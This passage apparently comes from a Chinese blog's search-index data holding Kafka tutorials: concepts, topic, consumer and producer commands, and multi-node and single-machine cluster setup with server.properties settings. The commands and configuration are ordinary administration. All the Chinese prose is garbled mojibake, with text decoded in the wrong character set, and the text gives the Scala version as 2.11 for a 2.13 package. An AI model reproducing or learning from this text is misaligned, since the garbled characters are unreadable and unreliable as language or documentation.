ç»„æˆã€‚æ¶ˆè´¹è€…ç»„å†…æ¯ä¸ªæ¶ˆè´¹è€…è´Ÿè´£æ¶ˆè´¹ä¸åŒåˆ†åŒºçš„æ•°æ®ï¼Œä¸€ä¸ªåˆ†åŒºåªèƒ½ç”±ä¸€ä¸ªç»„å†…æ¶ˆè´¹è€…æ¶ˆè´¹ï¼Œæ¶ˆè´¹è€…ç»„ä¹‹é—´äº’ä¸å½±å“ã€‚æ‰€æœ‰çš„æ¶ˆè´¹è€…éƒ½å±äºæŸä¸ªæ¶ˆè´¹è€…ç»„ï¼Œå³æ¶ˆè´¹è€…ç»„æ˜¯é€»è¾‘ä¸Šçš„ä¸€ä¸ªè®¢é˜…è€…ã€‚ Brokerï¼šä¸€å° Kafka æœåŠ¡å™¨å°±æ˜¯ä¸€ä¸ª brokerã€‚ä¸€ä¸ª Kafka é›†ç¾¤ç”±å¤šä¸ª broker ç»„æˆã€‚ä¸€ä¸ª broker å¯ä»¥å®¹çº³å¤šä¸ª topicã€‚ Topicï¼šä¸»é¢˜ï¼Œå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªé˜Ÿåˆ—ï¼Œç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…é¢å‘çš„éƒ½æ˜¯ä¸€ä¸ª topicã€‚ Partitionï¼šåˆ†åŒºï¼Œä¸ºäº†å®ç°æ‰©å±•æ€§ï¼Œä¸€ä¸ªéå¸¸å¤§çš„ topic å¯ä»¥åˆ†å¸ƒåˆ°å¤šä¸ª brokerï¼ˆå³ Kafka æœåŠ¡å™¨ï¼‰ä¸Šï¼Œä¸€ä¸ª topic å¯ä»¥åˆ†ä¸ºå¤šä¸ª partitionï¼Œæ¯ä¸ª partition æ˜¯ä¸€ä¸ªæœ‰åºçš„é˜Ÿåˆ—ã€‚ Replicaï¼šå‰¯æœ¬ï¼Œä¸ºä¿è¯é›†ç¾¤ä¸­çš„æŸä¸ªèŠ‚ç‚¹å‘ç”Ÿæ•…éšœæ—¶ï¼Œè¯¥èŠ‚ç‚¹ä¸Šçš„ partition æ•°æ®ä¸ä¸¢å¤±ï¼Œä¸”è®© Kafka ä»ç„¶èƒ½å¤Ÿç»§ç»­å·¥ä½œï¼ŒKafka ä¸ºæ­¤æä¾›äº†å‰¯æœ¬æœºåˆ¶ã€‚ä¸€ä¸ª topic çš„æ¯ä¸ªåˆ†åŒºéƒ½æœ‰è‹¥å¹²ä¸ªå‰¯æœ¬ï¼ŒåŒ…æ‹¬ä¸€ä¸ª leader å’Œè‹¥å¹²ä¸ª followerã€‚ Leaderï¼šæ¯ä¸ªåˆ†åŒºå¤šä¸ªå‰¯æœ¬çš„ ä¸»ï¼Œç”Ÿäº§è€…å‘é€æ•°æ®çš„å¯¹è±¡ï¼Œä»¥åŠæ¶ˆè´¹è€…æ¶ˆè´¹æ•°æ®çš„å¯¹è±¡éƒ½æ˜¯ leaderã€‚ Followerï¼šæ¯ä¸ªåˆ†åŒºå¤šä¸ªå‰¯æœ¬çš„ ä»ï¼Œå®æ—¶ä» leader ä¸­åŒæ­¥æ•°æ®ï¼Œä¿æŒå’Œ leader æ•°æ®çš„åŒæ­¥ã€‚leader å‘ç”Ÿæ•…éšœæ—¶ï¼ŒæŸä¸ª follower ä¼šæˆä¸ºæ–°çš„ leaderã€‚ Kafka ä¼ä¸šæ¡ˆä¾‹ Kafka é›†ç¾¤æ­å»ºå•æœºæ­å»º Kafka é›†ç¾¤ Linux å•æœºæ­å»º Kafka é›†ç¾¤ ç”Ÿäº§ç¯å¢ƒæ­å»º Kafka é›†ç¾¤ Linux ç”Ÿäº§ç¯å¢ƒæ­å»º Kafka é›†ç¾¤ Kafka å¸¸ç”¨å‘½ä»¤Topic å‘½ä»¤å‘½ä»¤å‚æ•° ä½¿ç”¨æ¡ˆä¾‹ åˆ›å»ºä¸»é¢˜ï¼šåˆ›å»ºåç§°ä¸º testã€åˆ†åŒºæ•°é‡ä¸º 1 å’Œ åˆ†åŒºå‰¯æœ¬æ•°é‡ä¸º 3 çš„ä¸»é¢˜ 1# ./kafka-topics.sh --create --bootstrap-server 127.0.0.1:9092 --topic test --partitions 1 --replication-factor 3 æŸ¥çœ‹ä¸»é¢˜åˆ—è¡¨ 1# ./kafka-topics.sh --list --bootstrap-server 127.0.0.1:9092 æŸ¥çœ‹ä¸»é¢˜è¯¦æƒ…ï¼šæŸ¥çœ‹ test ä¸»é¢˜çš„è¯¦ç»†ä¿¡æ¯ï¼ˆä¾‹å¦‚åˆ†åŒºæ•°é‡ã€åˆ†åŒºå‰¯æœ¬æ•°é‡ç­‰ï¼‰ 1# ./kafka-topics.sh --describe --bootstrap-server 127.0.0.1:9092 --topic test æ›´æ”¹ä¸»é¢˜çš„åˆ†åŒºæ•°é‡ï¼šæ›´æ”¹ test ä¸»é¢˜çš„åˆ†åŒºæ•°é‡ä¸º 3 1# ./kafka-topics.sh --alter --bootstrap-server 127.0.0.1:9092 --topic test --partitions 3 ç‰¹åˆ«æ³¨æ„ Kafka ä¸æ”¯æŒæ›´æ”¹ä¸»é¢˜çš„åˆ†åŒºå‰¯æœ¬æ•°é‡ æ›´æ”¹ä¸»é¢˜çš„åˆ†åŒºæ•°é‡æ—¶ï¼Œåªèƒ½å¢åŠ ï¼Œä¸èƒ½å‡å°‘ åˆ é™¤ä¸»é¢˜ï¼šåˆ é™¤ test ä¸»é¢˜ 1# ./kafka-topics.sh --delete --bootstrap-server 127.0.0.1:9092 --topic test Consumer å‘½ä»¤å‘½ä»¤å‚æ•° ä½¿ç”¨æ¡ˆä¾‹ æ¶ˆè´¹ test ä¸»é¢˜ä¸­çš„æ•°æ®ï¼ˆå¢é‡æ¶ˆè´¹ï¼‰ 1# ./kafka-console-consumer.sh --bootstrap-server 127.0.0.1:9092 --topic test æ¶ˆè´¹ test ä¸»é¢˜ä¸­çš„æ‰€æœ‰æ•°æ®ï¼ˆåŒ…æ‹¬å†å²æ•°æ®ï¼‰ 1# ./kafka-console-consumer.sh --bootstrap-server 127.0.0.1:9092 --topic test --from-beginning Producer å‘½ä»¤å‘½ä»¤å‚æ•° ä½¿ç”¨æ¡ˆä¾‹ ç”Ÿäº§æ¶ˆæ¯ï¼šå¾€ test ä¸»é¢˜å‘é€æ¶ˆæ¯ 1# ./kafka-console-producer.sh --broker-list 127.0.0.1:9092 --topic test var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"åˆ†å¸ƒå¼"},{title:"Linux ç”Ÿäº§ç¯å¢ƒæ­å»º Kafka é›†ç¾¤",url:"/posts/6dceb9c9.html",text:'å‰è¨€æœ¬æ–‡é€‚ç”¨äºåœ¨ Centos/Debian/Ubuntu ç­‰ Linux å‘è¡Œç‰ˆç³»ç»Ÿä¸Šï¼Œä½¿ç”¨å¤šå°ç‰©ç†æœºå™¨ï¼ˆè‡³å°‘ä¸‰å°ï¼‰æ­å»º Kafka é›†ç¾¤ã€‚ Zookeeper é›†ç¾¤æ­å»ºæœ¬æ–‡çš„ Kafka é›†ç¾¤æ­å»ºä¾èµ–äº Zookeeperï¼Œå› æ­¤ç”Ÿäº§ç¯å¢ƒéœ€è¦å°† Zookeeper é›†ç¾¤æå‰æ­å»ºèµ·æ¥ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œä» Kafka 2.8.0 ç‰ˆæœ¬å¼€å§‹ï¼ŒKafka è‡ªèº«å®ç°äº† Raft åˆ†å¸ƒå¼ä¸€è‡´æ€§æœºåˆ¶ï¼Œè¿™æ„å‘³ç€ Kafka æ˜¯å¯ä»¥è„±ç¦» ZooKeeper ç‹¬ç«‹è¿è¡Œçš„ã€‚ é›†ç¾¤è§„åˆ’ èŠ‚ç‚¹ IP åœ°å€ ç«¯å£ ç‰ˆæœ¬å· Zookeeper èŠ‚ç‚¹ 1 192.168.1.1 2181 3.4.10 Zookeeper èŠ‚ç‚¹ 2 192.168.1.2 2181 3.4.10 Zookeeper èŠ‚ç‚¹ 3 192.168.1.3 2181 3.4.10 é›†ç¾¤éƒ¨ç½²ç”±äºç¯‡å¹…æœ‰é™ï¼ŒLinux ç”Ÿäº§ç¯å¢ƒæ­å»º Zookeeper é›†ç¾¤çš„å†…å®¹è¿™é‡Œä¸å†ç´¯è¿°ï¼Œè¯¦ç»†æ•™ç¨‹å¯çœ‹ è¿™é‡Œã€‚ Kafka é›†ç¾¤æ­å»ºé›†ç¾¤è§„åˆ’ èŠ‚ç‚¹ IP åœ°å€ ç«¯å£ ç‰ˆæœ¬å· Kafka èŠ‚ç‚¹ 1 192.168.1.1 9092 2.13-3.2.1 Kafka èŠ‚ç‚¹ 2 192.168.1.2 9092 2.13-3.2.1 Kafka èŠ‚ç‚¹ 3 192.168.1.3 9092 2.13-3.2.1 é›†ç¾¤æ­å»º Kafka ä¸‹è½½ Kafka çš„å®‰è£…åŒ…å¯ä»¥ä» å®˜ç½‘ ä¸‹è½½ã€‚ ä»¥ä¸‹è½½å¾—åˆ°çš„å‹ç¼©æ–‡ä»¶ kafka_2.13-3.2.1.tgz ä¸ºä¾‹ï¼Œ2.11 æ˜¯ Scala çš„ç‰ˆæœ¬å·ï¼Œ3.2.1 æ˜¯ Kafka çš„ç‰ˆæœ¬å·ã€‚ Kafka å®‰è£… 1234567891011121314151617# åˆ›å»ºå®‰è£…ç›®å½•# mkdir -p /usr/local/kafka-cluster# è¿›å…¥å®‰è£…ç›®å½•# cd /usr/local/kafka-cluster# ä¸‹è½½æ–‡ä»¶# wget https://downloads.apache.org/kafka/3.2.1/kafka_2.13-3.2.1.tgz# è§£å‹æ–‡ä»¶# tar -xvf kafka_2.13-3.2.1.tgz# é‡å‘½åç›®å½•# mv kafka_2.13-3.2.1 kafka-node1# åˆ é™¤æ–‡ä»¶# rm -rf kafka_2.13-3.2.1.tgz Kafka åŸºç¡€é…ç½® 12345678# è¿›å…¥å®‰è£…ç›®å½•# cd /usr/local/kafka-cluster/kafka-node1# åˆ›å»ºæ—¥å¿—ç›®å½•ï¼ˆæ•°æ®å­˜å‚¨ç›®å½•ï¼‰# mkdir logs# ç¼–è¾‘é…ç½®æ–‡ä»¶ï¼ˆæŒ‡å®šä»¥ä¸‹å†…å®¹å³å¯ï¼‰# vim config/server.properties æœ€å…³é”®çš„é…ç½®å†…å®¹æ˜¯ broker.idã€log.dirsã€zookeeper.connectï¼Œå…¶ä¸­çš„ zookeeper.connect æ˜¯ Zookeeper è¿æ¥åœ°å€ï¼Œå»ºè®®ä½¿ç”¨ /kafka ä½œä¸ºåç¼€ï¼Œè¿™æ ·æ–¹ä¾¿æ—¥ååœ¨ Zookeeper é‡Œç»Ÿä¸€ç®¡ç† Kafka çš„æ•°æ®ã€‚ 12345678910111213141516171819202122232425262728# broker çš„å…¨å±€å”¯ä¸€ç¼–å·,ä¸èƒ½é‡å¤broker.id=1# å¤„ç†ç½‘ç»œè¯·æ±‚çš„çº¿ç¨‹æ•°é‡num.network.threads=3# ç”¨æ¥å¤„ç†ç£ç›˜ IO çš„ç°æˆæ•°é‡num.io.threads=8# å‘é€å¥—æ¥å­—çš„ç¼“å†²åŒºå¤§å°socket.send.buffer.bytes=102400# æ¥æ”¶å¥—æ¥å­—çš„ç¼“å†²åŒºå¤§å°socket.receive.buffer.bytes=102400# è¯·æ±‚å¥—æ¥å­—çš„ç¼“å†²åŒºå¤§å°socket.request.max.bytes=104857600# è¿è¡Œæ—¥å¿—å­˜æ”¾çš„è·¯å¾„log.dirs=/usr/local/kafka-cluster/kafka-node1/logs# topic åœ¨å½“å‰ broker ä¸Šçš„åˆ†åŒºä¸ªæ•°num.partitions=1# ç”¨æ¥æ¢å¤å’Œæ¸…ç† data ä¸‹æ•°æ®çš„çº¿ç¨‹æ•°é‡num.recovery.threads.per.data.dir=1# æ¯ä¸ª topic åˆ›å»ºæ—¶çš„å‰¯æœ¬æ•°,é»˜è®¤æ—¶ 1 ä¸ªå‰¯æœ¬offsets.topic.replication.factor=1# æ¯ä¸ª segment æ–‡ä»¶ä¿ç•™çš„æœ€é•¿æ—¶é—´,è¶…æ—¶å°†è¢«åˆ é™¤log.retention.hours=168# æ¯ä¸ª segment æ–‡ä»¶çš„å¤§å°,é»˜è®¤æœ€å¤§ 1Glog.segment.bytes=1073741824# æ£€æŸ¥è¿‡æœŸæ•°æ®çš„æ—¶é—´,é»˜è®¤ 5 åˆ†é’Ÿæ£€æŸ¥ä¸€æ¬¡æ˜¯å¦æ•°æ®è¿‡æœŸlog.retention.check.interval.ms=300000# é…ç½®è¿æ¥ Zookeeper é›†ç¾¤åœ°å€zookeeper.connect=192.168.1.1:2181,192.168.1.2:2181,192.168.1.3:2181/kafka Kafka åˆ›å»ºå¤šä¸ªèŠ‚ç‚¹ å¤åˆ¶ä¸¤ä»½ä¸Šé¢å·²ç»é…ç½®å¥½çš„ Kafka å®‰è£…ç›®å½•åˆ°å…¶ä»–æœåŠ¡å™¨èŠ‚ç‚¹ä¸Šï¼Œä»¥æ­¤ä½œä¸ºé›†ç¾¤ä¸­å¦å¤–ä¸¤ä¸ªèŠ‚ç‚¹çš„å®‰è£…æ–‡ä»¶ï¼Œä¾‹å¦‚ kafka-node2ã€kafka-node3ã€‚å®‰è£…ç›®å½•å¤åˆ¶å®Œæˆåï¼Œè¿˜éœ€è¦æ›´æ”¹æ¯ä¸ªæ–°èŠ‚ç‚¹é‡Œçš„ server.properties é…ç½®æ–‡ä»¶çš„ broker.idã€log.dirsã€‚èŠ‚ç‚¹äºŒå’ŒèŠ‚ç‚¹ä¸‰çš„æœ€ç»ˆé…ç½®å¦‚ä¸‹ï¼š 123# èŠ‚ç‚¹äºŒçš„é…ç½®broker.id=2log.dirs=/usr/local/kafka-cluster/kafka-node2/logs 123# èŠ‚ç‚¹ä¸‰çš„é…ç½®broker.id=3log.dirs=/usr/local/kafka-cluster/kafka-node3/logs é›†ç¾¤ç®¡ç† é›†ç¾¤å¯åŠ¨ æ³¨æ„ å¯åŠ¨ Kafka é›†ç¾¤ä¹‹å‰ï¼Œå¿…é¡»ç¡®ä¿ Zookeeper é›†ç¾¤å·²ç»å¯åŠ¨æˆåŠŸï¼Œè¿™æ˜¯å› ä¸ºæœ¬æ–‡æ­å»ºçš„ Kafka é›†ç¾¤ä¾èµ–äº Zookeeper é›†ç¾¤ã€‚ 123456789# åå°å¯åŠ¨# /usr/local/kafka-cluster/kafka-node1/bin/kafka-server-start.sh -daemon /usr/local/kafka-cluster/kafka-node1/config/server.properties# /usr/local/kafka-cluster/kafka-node2/bin/kafka-server-start.sh -daemon /usr/local/kafka-cluster/kafka-node2/config/server.properties# /usr/local/kafka-cluster/kafka-node3/bin/kafka-server-start.sh -daemon /usr/local/kafka-cluster/kafka-node3/config/server.properties# æˆ–è€…å‰å°å¯åŠ¨ï¼ˆå¯ç›´æ¥æŸ¥çœ‹å¯åŠ¨æ—¶è¾“å‡ºçš„æ—¥å¿—ä¿¡æ¯ï¼‰# /usr/local/kafka-cluster/kafka-node1/bin/kafka-server-start.sh /usr/local/kafka-cluster/kafka-node1/config/server.properties# /usr/local/kafka-cluster/kafka-node2/bin/kafka-server-start.sh /usr/local/kafka-cluster/kafka-node2/config/server.properties# /usr/local/kafka-cluster/kafka-node3/bin/kafka-server-start.sh /usr/local/kafka-cluster/kafka-node3/config/server.properties æŸ¥çœ‹çŠ¶æ€ é›†ç¾¤å¯åŠ¨åï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹é›†ç¾¤çš„è¿è¡ŒçŠ¶æ€ã€‚å¦‚æœå‘ç°é›†ç¾¤å¯åŠ¨å¤±è´¥ï¼Œåˆ™å¯ä»¥ä½¿ç”¨å‰å°çš„æ–¹å¼å†æ¬¡å¯åŠ¨é›†ç¾¤ï¼Œç„¶åæ ¹æ®ç»ˆç«¯è¾“å‡ºçš„é”™è¯¯æ—¥å¿—ä¿¡æ¯æ¥å®šä½é—®é¢˜ã€‚ 12345678910# æŸ¥çœ‹ç«¯å£å ç”¨æƒ…å†µ# netstat -nplt | grep 9092# netstat -nplt | grep 9093# netstat -nplt | grep 9094# æŸ¥çœ‹Kafkaè¿›ç¨‹# ps -aux | grep kafka# æŸ¥çœ‹Javaè¿›ç¨‹# jps -l é›†ç¾¤å…³é—­ æ³¨æ„ å…³é—­ Kafka é›†ç¾¤æ—¶ï¼Œä¸€å®šè¦ç­‰ Kafka æ‰€æœ‰èŠ‚ç‚¹è¿›ç¨‹å…¨éƒ¨å…³é—­åå†å…³é—­ Zookeeper é›†ç¾¤ã€‚å› ä¸º Zookeeper é›†ç¾¤å½“ä¸­è®°å½•ç€ Kafka é›†ç¾¤çš„ç›¸å…³ä¿¡æ¯ï¼ŒZookeeper é›†ç¾¤ä¸€æ—¦å…ˆå…³é—­ï¼ŒKafka é›†ç¾¤å°±æ²¡æœ‰åŠæ³•å†è·å–å…³é—­è¿›ç¨‹çš„ä¿¡æ¯ï¼Œæ­¤æ—¶åªèƒ½æ‰‹åŠ¨å¼ºåˆ¶æ€æ­» Kafka è¿›ç¨‹ã€‚ 123# /usr/local/kafka-cluster/kafka-node1/bin/kafka-server-stop.sh stop# /usr/local/kafka-cluster/kafka-node2/bin/kafka-server-stop.sh stop# /usr/local/kafka-cluster/kafka-node3/bin/kafka-server-stop.sh stop æ¸…ç©ºæ•°æ® è‹¥å¸Œæœ›æ¸…ç©º Kafka é›†ç¾¤çš„æ•°æ®ï¼Œåˆ™å¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤æ“ä½œã€‚æ¸…ç©ºæ•°æ®çš„æ“ä½œä¸å¯æ¢å¤ï¼Œç”Ÿäº§ç¯å¢ƒä¸‹æ…ç”¨ã€‚ ç¬¬ä¸€æ­¥ï¼šå…³é—­ Kafka é›†ç¾¤ç¬¬äºŒæ­¥ï¼šè¿æ¥ Zookeeper é›†ç¾¤ï¼Œç„¶ååˆ é™¤ /kafka ç›®å½•ç¬¬ä¸‰æ­¥ï¼šåˆ é™¤ Kafka å„ä¸ªé›†ç¾¤èŠ‚ç‚¹çš„å®‰è£…ç›®å½•ä¸‹çš„ logs ç›®å½•ï¼ˆæ–‡ä»¶å¤¹ï¼‰ç¬¬å››æ­¥ï¼šé‡å¯ Kafka é›†ç¾¤ é›†ç¾¤æµ‹è¯• è¿›å…¥ä»»æ„èŠ‚ç‚¹çš„å®‰è£…ç›®å½•ä¸‹çš„ bin ç›®å½• 12# è¿›å…¥å®‰è£…ç›®å½•# cd /usr/local/kafka-cluster/kafka-node1/bin åˆ›å»ºä¸»é¢˜ 12# åˆ›å»ºä¸»é¢˜# ./kafka-topics.sh --create --bootstrap-server 192.168.1.1:9092 --replication-factor 3 --partitions 1 --topic test æŸ¥çœ‹ä¸»é¢˜åˆ—è¡¨ 12# æŸ¥çœ‹ä¸»é¢˜åˆ—è¡¨# ./kafka-topics.sh --list --bootstrap-server 192.168.1.1:9092 æŸ¥çœ‹ä¸»é¢˜è¯¦ç»†ä¿¡æ¯ 12# æŸ¥çœ‹ä¸»é¢˜è¯¦ç»†ä¿¡æ¯# ./kafka-topics.sh --bootstrap-server 192.168.1.1:9092 --topic test --describe å¯åŠ¨æ§åˆ¶å°æ¶ˆè´¹è€… 12# å¯åŠ¨æ¶ˆè´¹è€…# ./kafka-console-consumer.sh --bootstrap-server 192.168.1.1:9092 --topic test --from-beginning å¯åŠ¨æ§åˆ¶å°ç”Ÿäº§è€… 12# å¯åŠ¨ç”Ÿäº§è€…# ./kafka-console-producer.sh --broker-list 192.168.1.1:9092 --topic test ç”Ÿäº§è€…æ­£å¸¸å¯åŠ¨åï¼Œåœ¨ç”Ÿäº§è€…çš„æ§åˆ¶å°æ‰‹åŠ¨è¾“å…¥ hello kafkaï¼Œæ¶ˆè´¹è€…çš„æ§åˆ¶å°å°±å¯ä»¥æ¶ˆè´¹åˆ°ç”Ÿäº§è€…çš„æ¶ˆæ¯ï¼Œå¹¶è¾“å‡º hello kafkaï¼Œè¿™è¡¨ç¤ºæ¶ˆè´¹è€…æˆåŠŸæ¶ˆè´¹äº†ç”Ÿäº§è€…å‘é€çš„æ¶ˆæ¯ï¼ Kafka æ›´æ”¹ç«¯å£ï¼ˆå¯é€‰ï¼‰è‹¥å¸Œæœ›æ›´æ”¹ Kafka çš„é»˜è®¤ç«¯å£ï¼ˆ9092ï¼‰ï¼Œå¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤æ›´æ”¹ Kafka å®‰è£…ç›®å½•ä¸‹ config å­ç›®å½•é‡Œçš„å„ä¸ªé…ç½®æ–‡ä»¶ã€‚ä¾‹å¦‚å¯ä»¥å°† Kafka çš„é»˜è®¤ç«¯å£æ›´æ”¹ä¸º 9090ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 1234# vim config/server.properties# é»˜è®¤ç«¯å£å·listeners=PLAINTEXT://:9090 1234# vim config/connect-standalone.properties# å•æœºç¯å¢ƒçš„ç«¯å£å·bootstrap.servers=localhost:9090 1234# vim config/connect-distributed.properties# é›†ç¾¤ç¯å¢ƒçš„ç«¯å£å·bootstrap.servers=localhost:9090 1234# vim config/producer.properties# å‘å¸ƒç«¯çš„ç«¯å£å·bootstrap.servers=localhost:9090 1234# vim config/consumer.properties# æ¶ˆè´¹ç«¯çš„ç«¯å£å·bootstrap.servers=localhost:9090 å‚è€ƒåšå®¢ Kafka é›†ç¾¤æ­å»ºè¶…è¯¦ç»†æ•™ç¨‹ Linux å•æœºæ­å»º Kafka é›†ç¾¤ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"Linux å•æœºæ­å»º Kafka é›†ç¾¤",url:"/posts/124a5015.html",text:'å‰è¨€æœ¬æ–‡é€‚ç”¨äºåœ¨ Centos/Debian/Ubuntu ç­‰ Linux å‘è¡Œç‰ˆç³»ç»Ÿä¸Šï¼Œä½¿ç”¨å•æœºæ­å»º Kafka é›†ç¾¤ã€‚ Zookeeper é›†ç¾¤æ­å»ºæœ¬æ–‡çš„ Kafka é›†ç¾¤æ­å»ºä¾èµ–äº Zookeeperï¼Œå› æ­¤éœ€è¦å°† Zookeeper å•æœºé›†ç¾¤æå‰æ­å»ºèµ·æ¥ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œä» Kafka 2.8.0 ç‰ˆæœ¬å¼€å§‹ï¼ŒKafka è‡ªèº«å®ç°äº† Raft åˆ†å¸ƒå¼ä¸€è‡´æ€§æœºåˆ¶ï¼Œè¿™æ„å‘³ç€ Kafka æ˜¯å¯ä»¥è„±ç¦» ZooKeeper ç‹¬ç«‹è¿è¡Œçš„ã€‚ é›†ç¾¤è§„åˆ’ èŠ‚ç‚¹ IP åœ°å€ ç«¯å£ ç‰ˆæœ¬å· Zookeeper èŠ‚ç‚¹ 1 127.0.0.1 2181 3.4.10 Zookeeper èŠ‚ç‚¹ 2 127.0.0.1 2182 3.4.10 Zookeeper èŠ‚ç‚¹ 3 127.0.0.1 2183 3.4.10 é›†ç¾¤æ­å»ºç”±äºç¯‡å¹…æœ‰é™ï¼ŒLinux å•æœºæ­å»º Zookeeper é›†ç¾¤çš„å†…å®¹è¿™é‡Œä¸å†ç´¯è¿°ï¼Œè¯¦ç»†æ•™ç¨‹å¯çœ‹ è¿™é‡Œã€‚ Kafka é›†ç¾¤æ­å»ºé›†ç¾¤è§„åˆ’ èŠ‚ç‚¹ IP åœ°å€ ç«¯å£ ç‰ˆæœ¬å· Kafka èŠ‚ç‚¹ 1 127.0.0.1 9092 2.13-3.2.1 Kafka èŠ‚ç‚¹ 2 127.0.0.1 9093 2.13-3.2.1 Kafka èŠ‚ç‚¹ 3 127.0.0.1 9094 2.13-3.2.1 é›†ç¾¤æ­å»º Kafka ä¸‹è½½ Kafka çš„å®‰è£…åŒ…å¯ä»¥ä» å®˜ç½‘ ä¸‹è½½ã€‚ ä»¥ä¸‹è½½å¾—åˆ°çš„å‹ç¼©æ–‡ä»¶ kafka_2.13-3.2.1.tgz ä¸ºä¾‹ï¼Œ2.11 æ˜¯ Scala çš„ç‰ˆæœ¬å·ï¼Œ3.2.1 æ˜¯ Kafka çš„ç‰ˆæœ¬å·ã€‚ Kafka å®‰è£… 1234567891011121314151617# åˆ›å»ºå®‰è£…ç›®å½•# mkdir -p /usr/local/kafka-cluster# è¿›å…¥å®‰è£…ç›®å½•# cd /usr/local/kafka-cluster# ä¸‹è½½æ–‡ä»¶# wget https://downloads.apache.org/kafka/3.2.1/kafka_2.13-3.2.1.tgz# è§£å‹æ–‡ä»¶# tar -xvf kafka_2.13-3.2.1.tgz# é‡å‘½åç›®å½•# mv kafka_2.13-3.2.1 kafka-node1# åˆ é™¤æ–‡ä»¶# rm -rf kafka_2.13-3.2.1.tgz Kafka åŸºç¡€é…ç½® 12345678# è¿›å…¥å®‰è£…ç›®å½•# cd /usr/local/kafka-cluster/kafka-node1# åˆ›å»ºæ—¥å¿—ç›®å½•ï¼ˆæ•°æ®å­˜å‚¨ç›®å½•ï¼‰# mkdir logs# ç¼–è¾‘é…ç½®æ–‡ä»¶ï¼ˆæŒ‡å®šä»¥ä¸‹å†…å®¹å³å¯ï¼‰# vim config/server.properties æœ€å…³é”®çš„é…ç½®å†…å®¹æ˜¯ broker.idã€log.dirsã€zookeeper.connectï¼Œå…¶ä¸­çš„ zookeeper.connect æ˜¯ Zookeeper è¿æ¥åœ°å€ï¼Œå»ºè®®ä½¿ç”¨ /kafka ä½œä¸ºåç¼€ï¼Œè¿™æ ·æ–¹ä¾¿æ—¥ååœ¨ Zookeeper é‡Œç»Ÿä¸€ç®¡ç† Kafka çš„æ•°æ®ã€‚åœ¨é¡¹ç›®çš„å¼€å‘æµ‹è¯•é˜¶æ®µï¼Œå…¶ä»–é…ç½®å†…å®¹æš‚æ—¶å¯ä»¥ä½¿ç”¨é»˜è®¤å€¼ã€‚ 12345678910111213141516171819202122232425262728# broker çš„å…¨å±€å”¯ä¸€ç¼–å·,ä¸èƒ½é‡å¤broker.id=1# å¤„ç†ç½‘ç»œè¯·æ±‚çš„çº¿ç¨‹æ•°é‡num.network.threads=3# ç”¨æ¥å¤„ç†ç£ç›˜ IO çš„ç°æˆæ•°é‡num.io.threads=8# å‘é€å¥—æ¥å­—çš„ç¼“å†²åŒºå¤§å°socket.send.buffer.bytes=102400# æ¥æ”¶å¥—æ¥å­—çš„ç¼“å†²åŒºå¤§å°socket.receive.buffer.bytes=102400# è¯·æ±‚å¥—æ¥å­—çš„ç¼“å†²åŒºå¤§å°socket.request.max.bytes=104857600# è¿è¡Œæ—¥å¿—å­˜æ”¾çš„è·¯å¾„log.dirs=/usr/local/kafka-cluster/kafka-node1/logs# topic åœ¨å½“å‰ broker ä¸Šçš„åˆ†åŒºä¸ªæ•°num.partitions=1# ç”¨æ¥æ¢å¤å’Œæ¸…ç† data ä¸‹æ•°æ®çš„çº¿ç¨‹æ•°é‡num.recovery.threads.per.data.dir=1# æ¯ä¸ª topic åˆ›å»ºæ—¶çš„å‰¯æœ¬æ•°,é»˜è®¤æ—¶ 1 ä¸ªå‰¯æœ¬offsets.topic.replication.factor=1# æ¯ä¸ª segment æ–‡ä»¶ä¿ç•™çš„æœ€é•¿æ—¶é—´,è¶…æ—¶å°†è¢«åˆ é™¤log.retention.hours=168# æ¯ä¸ª segment æ–‡ä»¶çš„å¤§å°,é»˜è®¤æœ€å¤§ 1Glog.segment.bytes=1073741824# æ£€æŸ¥è¿‡æœŸæ•°æ®çš„æ—¶é—´,é»˜è®¤ 5 åˆ†é’Ÿæ£€æŸ¥ä¸€æ¬¡æ˜¯å¦æ•°æ®è¿‡æœŸlog.retention.check.interval.ms=300000# é…ç½®è¿æ¥ Zookeeper é›†ç¾¤åœ°å€zookeeper.connect=127.0.0.1:2181,127.0.0.1:2182,127.0.0.1:2183/kafka Kafka ç«¯å£é…ç½® å•æœºæ­å»º Kafka é›†ç¾¤æ—¶ï¼Œä¸ºäº†è§£å†³ç«¯å£å†²çªçš„é—®é¢˜ï¼Œè¿˜éœ€è¦æŒ‡å®š Kafka ç›‘å¬çš„ç«¯å£ï¼Œå¿…é¡»å°†ä¸‹è¿°å„ä¸ªé…ç½®æ–‡ä»¶é‡Œçš„ç«¯å£éƒ½æ›´æ”¹æ‰ã€‚ 1234# vim config/server.properties# é»˜è®¤ç«¯å£å·listeners=PLAINTEXT://:9092 1234# vim config/connect-standalone.properties# å•æœºç¯å¢ƒçš„ç«¯å£å·bootstrap.servers=localhost:9092 1234# vim 